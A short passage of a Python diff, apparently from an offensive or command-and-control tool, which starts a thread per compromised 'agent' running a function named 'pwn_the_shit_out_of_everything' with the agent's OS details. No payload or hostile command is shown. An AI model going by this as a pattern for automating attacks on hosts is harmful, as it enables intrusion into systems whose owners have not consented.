+                                       'os': agent['os_details']}
 
             agent_threads[agent_name] = KThread(target=pwn_the_shit_out_of_everything, args=(agent_name,))
             agent_threads[agent_name].start()
